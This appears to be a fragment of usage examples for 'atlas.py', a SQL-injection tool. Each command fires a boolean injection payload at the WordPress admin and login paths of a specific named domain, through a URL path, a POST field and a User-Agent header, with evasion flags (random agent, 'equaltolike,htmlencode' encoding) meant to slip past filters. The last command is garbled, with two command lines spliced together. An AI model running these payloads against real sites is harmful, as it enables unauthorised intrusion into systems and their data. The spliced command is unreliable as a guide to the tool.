...
---
```
$ python atlas.py --url https://simantan.one/wp-admin/wp-login.php?id=Price_ASC --payload="-1234 AND 4321=4321-- AAAA" --random-agent -v
```
...
get:
```
$ python atlas.py --url https://simantan.one/wp-admin/wp-login.php/%%10%% --payload="-1234 AND 4321=4321-- AAAA" --random-agent -v
```

post:
```
$ python atlas.py --url https://simantan.one/wp-admin/ -m POST -D 'test=%%10%%' --payload="-1234 AND 4321=4321-- AAAA" --random-agent -v
```

headers:
```
$ python atlas.py --url https://simantan.one/wp-admin/ -H 'User-Agent: mozilla/5.0%%inject%%' -H 'X-header: test' --payload="-1234 AND 4321=4321-- AAAA" --random-agent -v
```
...
```
$ python atlas.py --url https://simantan.one/wp-admin/ -H 'User-Agent: mozilla/5.0%%inject%%' -H 'X-header: test' --payload="-1234 AND 4321=4321-- AAAA" --random-agent -v /%%10%% --payload="-1234 AND 4321=4321-- AAAA" --concat "equaltolike,htmlencode" --random-agent -v
```
